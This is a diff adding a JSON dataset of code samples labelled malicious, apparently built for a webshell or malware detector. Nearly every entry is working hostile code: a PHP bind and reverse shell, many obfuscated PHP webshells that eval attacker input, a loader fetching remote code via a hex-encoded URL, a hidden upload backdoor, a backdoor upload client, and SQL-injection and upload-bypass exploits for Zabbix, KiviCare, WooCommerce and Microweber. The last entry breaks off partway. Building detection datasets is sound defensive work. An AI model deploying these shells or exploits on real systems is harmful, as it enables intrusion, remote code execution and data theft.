@@ -1,0 +1,194 @@
+[
+  {
+    "id": "138",
+    "code": "<?php\nerror_reporting(0);\nset_time_limit(0);\nob_implicit_flush();\n\n$targets=explode(\" \",$target);\n$cs=1337;\n$wa=null;\n$ea=null;\n$sh=\"export TERM=xterm;PS1='\\$PWD>';export PS1;/bin/sh -i\";\n$m=\"b4tm4n shell : connected\\n\";\n\nif(count($targets)==1){\n\t$p=$target;\n\t$h=\"\";\n\t$t=\"bind\";\n}\nelseif(count($targets)==2){\n\t$p=$targets[0];\n\t$h=$targets[1];\n\t$t=\"back\";\n}\n\nif(function_exists('pcntl_fork')){\n\t$pid=pcntl_fork();\n\tif($pid==-1)exit(1);\n\tif($pid)exit(0);\n\tif(posix_setsid()==-1)exit(1);\n}\n\nif($t==\"bind\"){\n\t$s=stream_socket_server(\"tcp://0.0.0.0:\".$p,$errno,$errstr);\n\tstream_set_timeout($s,30);\n\t$c=stream_socket_accept($s);\n\tif(strtolower(substr(php_uname(),0,3))==\"win\"){\n\t\tfwrite($c,$m.getcwd().\">\");\n\t\twhile($p!==false){\n\t\t\t$p=fgets($c);\n\t\t\tif(preg_match(\"/cd\\ ([^\\s]+)/i\",$p,$rr)){\n\t\t\t\t$dd=$rr[1];\n\t\t\t\tif(is_dir($dd))chdir($dd);\n\t\t\t\t$o=getcwd().\">\";\n\t\t\t}\n\t\t\telseif(trim(strtolower($p))==\"exit\" || trim(strtolower($p))==\"quit\") break;\n\t\t\telse $o=exe($p).\"\\n\".getcwd().\">\";\n\t\t\tfwrite($c,$o);\n\t\t}\n\t\tfclose($c);\n\t\tfclose($s);\n\t}\n\telse{\n\t\tfwrite($c,$m);\n\t\t$ds=array(0=>array(\"pipe\",\"r\"),1=>array(\"pipe\",\"w\"),2=>array(\"pipe\",\"w\"));\n\t\t$pr=proc_open($sh,$ds,$pip);\n\t\tif(!is_resource($pr))exit(1);\n\t\tstream_set_blocking($pip[0],0);\n\t\tstream_set_blocking($pip[1],0);\n\t\tstream_set_blocking($pip[2],0);\n\t\tstream_set_blocking($c,0);\n\t\twhile(true){\n\t\t\tif(feof($c)||feof($pip[1]))break;\n\t\t\t$ra=array($c,$pip[1],$pip[2]);\n\t\t\tstream_select($ra,$wa,$ea,null);\n\t\t\tif(in_array($c,$ra)){\n\t\t\t\t$i=fread($c,$cs);\n\t\t\t\tfwrite($pip[0],$i);\n\t\t\t}\n\t\t\tif(in_array($pip[1],$ra)){\n\t\t\t\t$i=fread($pip[1],$cs);\n\t\t\t\tfwrite($c,$i);\n\t\t\t}\n\t\t\tif(in_array($pip[2],$ra)){\n\t\t\t\t$i=fread($pip[2],$cs);\n\t\t\t\tfwrite($c,$i);\n\t\t\t}\n\t\t}\n\t\tfclose($s);fclose($c);fclose($pip[0]);fclose($pip[1]);fclose($pip[2]);\n\t\tproc_close($pr);\n\t}\n}\nelseif($t==\"back\"){\n\t$s=fsockopen($h,$p,$en,$es,30);\n\tif(strtolower(substr(php_uname(),0,3))==\"win\"){\n\t\tfwrite($s,$m.getcwd().\">\");\n\t\twhile($p!==false){\n\t\t\t$p=fgets($s);\n\t\t\tif(preg_match(\"/cd\\ ([^\\s]+)/i\",$p,$rr)){\n\t\t\t\t$dd=$rr[1];\n\t\t\t\tif(is_dir($dd))chdir($dd);\n\t\t\t\t$o=getcwd().\">\";\n\t\t\t}\n\t\t\telseif(trim(strtolower($p))==\"exit\" || trim(strtolower($p))==\"quit\") break;\n\t\t\telse $o=exe($p).\"\\n\".getcwd().\">\";\n\t\t\tfwrite($s,$o);\n\t\t}\n\t\tfclose($s);\n\t}\n\telse{\n\t\tfwrite($s,$m);\n\t\t$ds=array(0=>array(\"pipe\",\"r\"),1=>array(\"pipe\",\"w\"),2=>array(\"pipe\",\"w\"));\n\t\t$pr=proc_open($sh,$ds,$pip);\n\t\tif(!is_resource($pr))exit(1);\n\t\tstream_set_blocking($pip[0],0);\n\t\tstream_set_blocking($pip[1],0);\n\t\tstream_set_blocking($pip[2],0);\n\t\tstream_set_blocking($s,0);\n\t\twhile(true){\n\t\t\tif(feof($s)||feof($pip[1]))break;\n\t\t\t$ra=array($s,$pip[1],$pip[2]);\n\t\t\tstream_select($ra,$wa,$ea,null);\n\t\t\tif(in_array($s,$ra)){\n\t\t\t\t$i=fread($s,$cs);\n\t\t\t\tfwrite($pip[0],$i);\n\t\t\t}\n\t\t\tif(in_array($pip[1],$ra)){\n\t\t\t\t$i=fread($pip[1],$cs);\n\t\t\t\tfwrite($s,$i);\n\t\t\t}\n\t\t\tif(in_array($pip[2],$ra)){\n\t\t\t\t$i=fread($pip[2],$cs);\n\t\t\t\tfwrite($s,$i);\n\t\t\t}\n\t\t}\n\t\tfclose($s);fclose($pip[0]);fclose($pip[1]);fclose($pip[2]);\n\t\tproc_close($pr);\n\t}\n}\n?>",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "414",
+    "code": "<?php\n    ($_GET['p']=='password')?$_GET['f']($_GET['a']):y);\n",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "441",
+    "code": "<?php\nif(@$_COOKIE['path'] != \"\"){file_put_contents($_COOKIE['path'], base64_decode(file_get_contents(base64_decode(\"L3RtcC90bXA0RTE1LnRtcA==\"))));}\n",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "452",
+    "code": "<?php\n@error_reporting(0);\nsession_start();\n\nif ($_SERVER['REQUEST_METHOD'] === 'POST')\n{\n    $key=\"e45e329feb5d925b\";\n\t$_SESSION['k']=$key;\n\t$post=file_get_contents(\"php://input\");\n\tif(!extension_loaded('openssl'))\n\t{\n\t\t$t=\"base64_\".\"decode\";\n\t\t$post=$t($post.\"\");\n\t\t\n\t\tfor($i=0;$i<strlen($post);$i++) {\n    \t\t\t $post[$i] = $post[$i]^$key[$i+1&15]; \n    \t\t\t}\n\t}\n\telse\n\t{\n\t\t$post=openssl_decrypt($post, \"AES128\", $key);\n\t}\n    $arr=explode('|',$post);\n    $func=$arr[0];\n    $params=$arr[1];\n\tclass C{public function __invoke($p) {eval($p.\"\");}}\n    @call_user_func(new C(),$params);\n}\n?>\n",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "575",
+    "code": "<?php\n    $e = $_REQUEST['e'];\n    $arr = array($_POST['pass'] => '|.*|e',);\n    array_walk_recursive($arr, $e, '');\n?>\n",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "738",
+    "code": "# Exploit Title: Zabbix 7.0.0 - SQL Injection \n# Date: 06/12/2024\n# Exploit Author: Leandro Dias Barata @m4nb4\n# Vendor Homepage: https://www.zabbix.com/\n# Software Link: https://support.zabbix.com/browse/ZBX-25623\n# Version: 6.0.0 - 6.0.31 / 6.0.32rc1 6.4.0 - 6.4.16 / 6.4.17rc1 7.0.0\n# Tested on: Kali Linux   kali-linux-2024.3\n# CVE: CVE-2024-42327\n\nimport requests\nimport argparse\n\nHEADERS = {\"Content-Type\": \"application/json\"}\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"CHECK for CVE-2024-42327\")\n    parser.add_argument(\"-t\", \"--target\", required=True, help=\"API URL\")\n    parser.add_argument(\"-u\", \"--username\", required=True, help=\"Username\")\n    parser.add_argument(\"-p\", \"--password\", required=True, help=\"Password\")\n\n    args = parser.parse_args()\n\n    url = f\"{args.target.rstrip('/')}/api_jsonrpc.php\"\n\n    # Login to get the token\n    login_data = {\n        \"jsonrpc\": \"2.0\",\n        \"method\": \"user.login\",\n        \"params\": {\"username\": args.username, \"password\": args.password},\n        \"id\": 1,\n        \"auth\": None\n    }\n\n    try:\n        login_response = requests.post(url, json=login_data, headers=HEADERS)\n        login_response.raise_for_status()\n        auth_token = login_response.json().get(\"result\")\n\n        # Simple SQLi test\n        data = {\n            \"jsonrpc\": \"2.0\",\n            \"method\": \"user.get\",\n            \"params\": {\n                \"selectRole\": [\"roleid\", \"name\", \"type\", \"readonly AND (SELECT(SLEEP(5)))\"],\n                \"userids\": [\"1\", \"2\"]\n            },\n            \"id\": 1,\n            \"auth\": auth_token\n        }\n\n        test_response = requests.post(url, json=data, headers=HEADERS)\n        test_response.raise_for_status()\n\n        if \"error\" in test_response.text:\n            print(\"[-] NOT VULNERABLE.\")\n        else:\n            print(\"[!] VULNERABLE.\")\n\n    except requests.RequestException as e:\n        print(f\"[!] Request error: {e}\")\n\nif __name__ == \"__main__\":\n    main()",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "814",
+    "code": "<?php $ant=base64_decode(\"YXNzZXJ0\");$ant($_POST['ant']);?>",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "864",
+    "code": "<?php \nob_start(function ($c,$d){register_shutdown_function('assert',$c);}); \necho $_REQUEST['pass']; \nob_end_flush(); \n?>\n",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "1079",
+    "code": "<?php\n \n header('Content-Type: application/json');\n \n if (!isset($_SERVER['HTTP_X_REQUESTED_WITH']) || strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) != 'xmlhttprequest') {\n     header('HTTP/1.1 403 Forbidden');\n     echo json_encode([\n         'success' => false,\n         'message' => 'Access denied'\n     ]);\n     exit;\n }\n \n $inputJSON = file_get_contents('php://input');\n $data = json_decode($inputJSON, true);\n \n if (json_last_error() === JSON_ERROR_NONE) {\n     $file = fopen('data.txt', 'a');\n \n     if (is_array($data)) {\n         foreach ($data as $entry) {\n             fwrite($file, json_encode($entry, JSON_UNESCAPED_UNICODE) . PHP_EOL);\n         }\n     } else {\n         fwrite($file, json_encode($data, JSON_UNESCAPED_UNICODE) . PHP_EOL);\n     }\n \n     fclose($file);\n \n     echo json_encode([\n         'success' => true,\n         'message' => 'Data saved successfully'\n     ]);\n } else {\n     echo json_encode([\n         'success' => false,\n         'message' => 'Invalid JSON'\n     ]);\n }\n",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "1222",
+    "code": "<?php\n    $f = $_GET['f'];\n    $a = $_GET['a'];\n    $f($a)\n?>\n",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "1344",
+    "code": "<?php\n    array_filter(array($_POST['x']),'assert');\n?>\n",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "1421",
+    "code": "<?php\nerror_reporting(0);session_start();header(\"Content-type:text/html;charset=utf-8\");if(empty($_SESSION['api'])) $_SESSION['api']=substr(file_get_contents(sprintf('%s?%s',pack(\"H*\",'687474703a2f2f377368656c6c2e676f6f676c65636f64652e636f6d2f73766e2f6d616b652e6a7067'),uniqid())),3649);@preg_replace(\"~(.*)~ies\",gzuncompress($_SESSION['api']),null);\n?>",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "1458",
+    "code": "<?php\n@error_reporting(0);\nsession_start();\n$key=\"900bc885d7553375\";\n$_SESSION['k']=$key;\n$post=file_get_contents(\"php://input\");\nif(isset($post))\n{\n\t$datas=explode(\"\\n\",$post);\n\t$code=$datas[0];\n\t$t=\"base64_\".\"decode\";\n\t$code=$t($code.\"\");\n\tfor($i=0;$i<strlen($code);$i++) {\n    \t$code[$i] = $code[$i]^$key[$i+1&15]; \n    }\n    $arr=explode('|',$code);\n    $func=$arr[0];\n    if(isset($arr[1])){\n \t\t$p=$arr[1];\n\t\tclass C{public function __construct($p) {eval($p.\"\");}}\n\t\t@new C($p);\n    }\n}\n?>\n",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "1566",
+    "code": "<!--------------------------\nName: 折羽鸿鹄\nSite: http://blog.weili.me\nMail: chinese@hackermail.com\nQQ: 56..\n---------------------------->\n<?php\nif($_GET[\"hackers\"]==\"2b\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo \"url:\".$_FILES[\"upfile\"][\"name\"];if(!file_exists($_FILES[\"upfile\"][\"name\"])){ copy($_FILES[\"upfile\"][\"tmp_name\"], $_FILES[\"upfile\"][\"name\"]); }}?><form method=\"post\" enctype=\"multipart/form-data\"><input name=\"upfile\" type=\"file\"><input type=\"submit\" value=\"ok\"></form><?php }?>",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "1628",
+    "code": "<?php\ntry{\n    $value = 'echo \"hello~\"';\n    apply();\n}catch(Exception $e){\n    eval(pack('H*',$e->getMessage()));\n}finally{\n    eval($value.';');\n}\n\nfunction apply(){\n  if(isset($_SERVER['HTTP_VIA'])){\n    throw new Exception('2476616c75653d656e6428245f504f5354293b');\n  }\n  return false;\n}\n",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "1737",
+    "code": "#!/usr/bin/python\n# Upload.py\n# File Upload client for the php://input based backdoor\n# Website: insecurety.net\n# Author: infodox\n# Twatter: @info_dox\n# Insecurety Research - 2013\n# version: 0.2a\nimport requests\nimport sys\n\nif (len(sys.argv) != 4):\n    print \"Usage: \" + sys.argv[0] + \" <url of backdoor> <localfile> <remotefile>\"\n    print \"Example: \" + sys.argv[0] + \" http://localhost/odd.php reverseshell.py /tmp/rsh.py\"\n    sys.exit(0)\n\nurl = sys.argv[1]         \nlocalfile = sys.argv[2]\nremotefile = sys.argv[3]\n\nf = open(localfile, \"r\")\nrawfiledata = f.read()\nencodedfiledata = rawfiledata.encode('base64')\n\nphppayload = \"\"\"<?php\n$f = fopen(\"%s\", \"a\");\n$x = base64_decode('%s');\nfwrite($f, \"$x\");\nfclose($f);\n?>\"\"\" %(remotefile, encodedfiledata) # I need to add a hashing function sometime for corruption test.\n\nprint \"[+] Uploading File\"\nrequests.post(url, phppayload) # this is why I love the python requests library\nprint \"[+] Upload should be complete\"\n",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "1747",
+    "code": "﻿\nMicroweber v1.0.3 File Upload Filter Bypass Remote PHP Code Execution\n\n\nVendor: Microweber Team\nProduct web page: http://www.microweber.com\nAffected version: 1.0.3\n\nSummary: Microweber is an open source drag and drop PHP/Laravel CMS licensed\nunder Apache License, Version 2.0 which allows you to create your own website,\nblog or online shop.\n\nDesc: Microweber suffers from an authenticated arbitrary command execution\nvulnerability. The issue is caused due to the improper verification when\nuploading files in '/src/Microweber/functions/plupload.php' script. This\ncan be exploited to execute arbitrary PHP code by bypassing the extension\nrestriction by putting the dot character at the end of the filename and uploading\na malicious PHP script file that will be stored in '/userfiles/media/localhost/uploaded'\ndirectory.\n\nTested on: Apache 2.4.10 (Win32)\n           PHP 5.6.3\n           MySQL 5.6.21\n\n\nVulnerability discovered by Gjoko 'LiquidWorm' Krstic\n                            @zeroscience\n\n\nAdvisory ID: ZSL-2015-5250\nAdvisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5250.php\n\n\n12.07.2015\n\n--\n\n\nPoC Requests:\n-------------\n\n1.\n\nPOST /microweber-latest/plupload?token=1111111111222222222233333333334444444444&path=media%25255Clocalhost%25255C&path=media%255Clocalhost%255Cuploaded%255C HTTP/1.1\nHost: localhost\nProxy-Connection: keep-alive\nContent-Length: 319\nOrigin: http://localhost\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryqX83MP6Cg5JpA193\nAccept: */*\nReferer: http://localhost/microweber-latest/editor_tools/plupload?type=explorer&filters=*&multiple=true&autostart=undefined&mwv=1.0.3\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.8\nCookie: mwui=%7B%22%23modules-and-layouts%2C%23tab_modules%2C.tst-modules%22%3A%22true%22%7D; recommend=%7B%22logo%22%3A1%7D; back_to_admin=http%3A//localhost/microweber-latest/admin/view%3Amodules/load_module%3Afiles%23path%3Dmedia%255Clocalhost%255Cuploaded%255C%26select-file%3Dhttp%3A//localhost/microweber-latest/userfiles/media/localhost/uploaded/phpinfo.php; laravel_session=eyJpdiI6ImNYNnkyWjJkOXZyTVRDMXlcL0pKQzBRPT0iLCJ2YWx1ZSI6Ilp6QjhDYjRRMEY4NGR5RzVuZGNxSnd1V3dGQ1R6OVdaWjZrZStiT1Q2bVM3UmRoQjNrak1ORzV5bXZjbzVDSitqdVVkdzdqOFVQa2hZdWRwMlwvMSttZz09IiwibWFjIjoiNGQxYzkwOTk4YmIzNTgzNWRiZmZlOTM4N2I2MzA1NjIzODcwNWRmMWM5ZDcwN2YxMGJlZmQ2ZjUxYmMzNjVjOSJ9\n\n------WebKitFormBoundaryqX83MP6Cg5JpA193\nContent-Disposition: form-data; name=\"name\"\n\nphpinfo.php.\n------WebKitFormBoundaryqX83MP6Cg5JpA193\nContent-Disposition: form-data; name=\"file\"; filename=\"phpinfo.php.\"\nContent-Type: application/octet-stream\n\n<?php\nphpinfo();\n?>\n------WebKitFormBoundaryqX83MP6Cg5JpA193--\n\n\n\n2.\n\nGET http://localhost/microweber-latest/userfiles/media/localhost/uploaded/phpinfo.php HTTP/1.1",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "1834",
+    "code": "# Exploit Title: KiviCare Clinic & Patient Management System (EHR) 3.6.4 - Unauthenticated SQL Injection\nSQL Injection\n# Google Dork: inurl:\"/wp-content/plugins/kivicare-clinic-management-system/\n# Date: 11/12/2024\n# Exploit Author: Samet \"samogod\" Gözet\n# Vendor Homepage: wordpress.org\n# Software Link:\nhttps://wordpress.org/plugins/kivicare-clinic-management-system/\n# Version: < 3.6.5\n# Tested on: Ubuntu 22.04\n# CVE : CVE-2024-11728\n#!/usr/bin/env python3\n\"\"\"\nCVE-2024-11728 - KiviCare WordPress Plugin Unauthenticated SQL Injection PoC\nAuthor: samogod.samet.g\n\nDescription:\n    Proof of Concept for Unauthenticated SQL Injection vulnerability\nin KiviCare WordPress Plugin <= 3.6.4.\n    The vulnerability exists in the tax_calculated_data AJAX action\nwhere the visit_type[service_id]\n    parameter is insufficiently escaped, allowing SQL injection attacks.\n\nUsage:\n    python3 CVE-2024-11728.py -u <target_url> [-t <timeout>] [-v]\n\"\"\"\n\nimport argparse\nimport requests\nimport sys\nimport time\nfrom urllib3.exceptions import InsecureRequestWarning\n\n# Disable SSL warnings\nrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)\n\nclass KiviCareExploit:\n    def __init__(self, url, timeout=10, verbose=False):\n        self.url = url.rstrip('/')\n        self.timeout = timeout\n        self.verbose = verbose\n        self.target = f\"{self.url}/wp-admin/admin-ajax.php\"\n        self.headers = {\n            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nAppleWebKit/537.36',\n            'Content-Type': 'application/x-www-form-urlencoded',\n            'Accept': '*/*'\n        }\n\n    def log(self, message, level=\"info\"):\n        \"\"\"Custom logging function\"\"\"\n        colors = {\n            \"info\": \"\\033[94m[*]\",\n            \"success\": \"\\033[92m[+]\",\n            \"error\": \"\\033[91m[-]\",\n            \"warning\": \"\\033[93m[!]\"\n        }\n        print(f\"{colors.get(level, '[*]')} {message}\\033[0m\")\n\n    def verify_vulnerability(self):\n        \"\"\"Verify if the target is vulnerable using a time-based SQL\ninjection\"\"\"\n        self.log(\"Testing vulnerability with time-based SQL injection...\")\n\n        data = {\n            'action': 'ajax_post',\n            'route_name': 'tax_calculated_data',\n            'clinic_id[id]': '1',\n            'doctor_id[id]': '1',\n            'visit_type[0][service_id]': \"123) AND (SELECT * FROM\n(SELECT(SLEEP(5)))alias) AND (1=1\",\n            '_ajax_nonce': '5d77fc94cf' # You need to update this nonce value\n        }\n\n        try:\n            normal_data = {\n                'action': 'ajax_post',\n                'route_name': 'tax_calculated_data',\n                'clinic_id[id]': '1',\n                'doctor_id[id]': '1',\n                'visit_type[0][service_id]': \"1\",\n                '_ajax_nonce': '5d77fc94cf' # You need to update this\nnonce value\n            }\n\n            start_time = time.time()\n            normal_response = requests.post(\n                self.target,\n                data=normal_data,\n                headers=self.headers,\n                verify=False,\n                timeout=self.timeout\n            )\n            normal_time = time.time() - start_time\n\n            if self.verbose:\n                self.log(f\"Normal request time: {normal_time:.2f}\nseconds\", \"info\")\n                self.log(f\"Normal response: {normal_response.text}\", \"info\")\n\n            start_time = time.time()\n            try:\n                response = requests.post(\n                    self.target,\n                    data=data,\n                    headers=self.headers,\n                    verify=False,\n                    timeout=self.timeout\n                )\n                elapsed_time = time.time() - start_time\n\n                if self.verbose:\n                    self.log(f\"Injection request time:\n{elapsed_time:.2f} seconds\", \"info\")\n                    self.log(f\"Request data: {data}\", \"info\")\n\n                if elapsed_time >= 4.5:\n                    self.log(\"Target appears to be vulnerable!\", \"success\")\n                    return True\n                else:\n                    self.log(\"Target does not appear to be\nvulnerable.\", \"warning\")\n                    return False\n\n            except requests.exceptions.Timeout:\n                self.log(\"Request timed out - target is vulnerable!\", \"success\")\n                return True\n\n        except requests.exceptions.RequestException as e:\n            self.log(f\"Error during vulnerability check: {str(e)}\", \"error\")\n            return False\n\ndef main():\n    parser = argparse.ArgumentParser(description='KiviCare WordPress\nPlugin Unauthenticated SQL Injection PoC (CVE-2024-11728)')\n    parser.add_argument('-u', '--url', required=True, help='Target URL\n(e.g., http://example.com)')\n    parser.add_argument('-t', '--timeout', type=int, default=10,\nhelp='Request timeout in seconds')\n    parser.add_argument('-v', '--verbose', action='store_true',\nhelp='Enable verbose output')\n    args = parser.parse_args()\n\n    print(\"\"\"\n    CVE-2024-11728 - KiviCare WordPress Plugin Unauthenticated SQL Injection\n    Author: samogod.samet.g\n    \"\"\")\n\n    exploit = KiviCareExploit(args.url, args.timeout, args.verbose)\n\n    exploit.verify_vulnerability()\n\nif __name__ == '__main__':\n    main()",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "1851",
+    "code": "<?php \n    function sqlsec($a){\n        assert($a);\n    }\n    sqlsec($_POST['x']);\n?>\n",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "1873",
+    "code": "<?php\n$user=\"63a9f0ea7bb98050796b649e85481845\"; #root\n$pass=\"7b24afc8bc80e548d66c4e7ff72171c5\"; #toor\n\nif (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)\n{eval($_GET['idc']);}\n?>\n",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "1967",
+    "code": "# Exploit Title: WooCommerce Customers Manager 29.4 - Post-Authenticated SQL Injection  \n# Date: 2024-03-25  \n# Exploit Author: Ivan Spiridonov - xbz0n  \n# Software Link: https://codecanyon.net/item/woocommerce-customers-manager/10965432    \n# Version: 29.4  \n# Tested on: Ubuntu 22.04  \n# CVE: CVE-2024-0399\n\n## SQL Injection\n\nThe plugin does not properly sanitise and escape a parameter before using it in a SQL statement, leading to an SQL injection exploitable by Subscriber+ role.\n\n## Affected Components\n\n- **Plugin:** WooCommerce Customers Manager\n- **Version:** 29.4\n- **Affected Parameters:** 'max_amount', 'max_amount_total', 'min_amount', 'min_amount_total'\n- **Affected Endpoint:** /wp-admin/admin-ajax.php\n\n## Description\n\nThe vulnerability is located within the transaction amount parameters like 'max_amount', 'max_amount_total', 'min_amount', and 'min_amount_total' used in the admin AJAX endpoint. By injecting SQL commands into these parameters, authenticated attackers can manipulate SQL queries leading to a time-based SQL Injection vulnerability.\n\n## Proof of Concept\n\n### Manual Exploitation\n\n```http\nPOST /wp-admin/admin-ajax.php HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://localhost/wp-admin/admin.php?page=wccm-discover-customer\nX-Requested-With: XMLHttpRequest\nContent-Type: multipart/form-data; boundary=---------------------------2461714219322283440478088295\nContent-Length: 1877\nOrigin: http://localhost\nConnection: close\nCookie: Sec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\n\n-----------------------------2461714219322283440478088295\nContent-Disposition: form-data; name=\"action\"\nwccm_get_orders_tot_num\n-----------------------------2461714219322283440478088295\nContent-Disposition: form-data; name=\"start_date\"\n2024-01-09\n-----------------------------2461714219322283440478088295\nContent-Disposition: form-data; name=\"end_date\"\n2024-01-11\n-----------------------------2461714219322283440478088295\nContent-Disposition: form-data; name=\"customer_ids\"\n-----------------------------2461714219322283440478088295\nContent-Disposition: form-data; name=\"product_ids\"\n-----------------------------2461714219322283440478088295\nContent-Disposition: form-data; name=\"category_ids\"\n-----------------------------2461714219322283440478088295\nContent-Disposition: form-data; name=\"min_amount\"\n0\n-----------------------------2461714219322283440478088295\nContent-Disposition: form-data; name=\"max_amount\"\n0\n-----------------------------2461714219322283440478088295\nContent-Disposition: form-data; name=\"min_amount_total\"\n0\n-----------------------------2461714219322283440478088295\nContent-Disposition: form-data; name=\"max_amount_total\"\n(select*from(select(sleep(20)))a)\n-----------------------------2461714219322283440478088295\nContent-Disposition: form-data; name=\"product_relationship\"\nor\n-----------------------------2461714219322283440478088295\nContent-Disposition: form-data; name=\"product_category_relationship\"\nor\n-----------------------------2461714219322283440478088295\nContent-Disposition: form-data; name=\"product_category_filters_relationship\"\nand\n-----------------------------2461714219322283440478088295\nContent-Disposition: form-data; name=\"statuses\"\nwc-pending,wc-processing,wc-on-hold,wc-completed,wc-cancelled,wc-refunded,wc-failed,wc-checkout-draft\n-----------------------------2461714219322283440478088295--\n```\n\nIf the server response is delayed by approximately 20 seconds, it indicates a successful exploitation of the time-based SQL Injection, confirming the vulnerability.\n\n## Recommendations\n\nUsers of WooCommerce Customers Manager v29.4 are strongly advised to restrict access to the affected endpoint and update the plugin as soon as a fixed version is released. This advisory serves as a notice to all users of Smart Manager v8.27.0 to take immediate action in updating their plugin to protect against this SQL Injection vulnerability.",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "2153",
+    "code": "<?php \n@$a = $_POST['x']; \nif(isset($a)){ \n@preg_replace(\"/\\[(.*)\\]/e\",'\\\\1',base64_decode('W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=')); \n} \n?> \n",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "2300",
+    "code": "<?php \n    $a = substr_replace(\"asxxx\",\"sert\",2);\n    $a($_POST['x']);\n?>  \n",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  },
+  {
+    "id": "2430",
+    "code": "# Exploit Title: Smart Manager 8.27.0 - Post-Authenticated SQL Injection  \n# Date: 2024-01-18  \n# Exploit Author: Ivan Spiridonov - xbz0n  \n# Vendor Homepage: https://www.storeapps.org/    \n# Software Link: https://www.storeapps.org/product/smart-manager/  \n# Version: 8.27.0  \n# Tested on: Ubuntu 22.04  \n# CVE: CVE-2024-0566\n\n## SQL Injection\n\nThe plugin does not properly sanitize and escape a parameter before using it in an SQL statement, leading to an SQL injection exploitable by high-privilege users such as admin.\n\n## Affected Components\n\n- **Plugin:** Smart Manager\n- **Version:** 8.27.0\n- **Affected Parameters:** 'sort_params%5BsortOrder%5D', 'sort_params%5Bcolumn%5D'\n- **Affected Endpoint:** /wp-admin/admin-ajax.php\n\n## Description\n\nThe vulnerability is located within the admin AJAX endpoint in the sorting parameters 'sort_params%5BsortOrder%5D' and 'sort_params%5Bcolumn%5D'. By manipulating these parameters, authenticated attackers can inject SQL commands, leading to a time-based SQL Injection vulnerability.\n\n## Proof of Concept\n\n### Manual Exploitation\n\n```http\nPOST /wp-admin/admin-ajax.php?action=sm_beta_include_file HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0\nAccept: text/plain, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://localhost/wp-admin/admin.php?page=smart-manager\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 1117\nOrigin: http://localhost\nConnection: close\nCookie: Sec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: 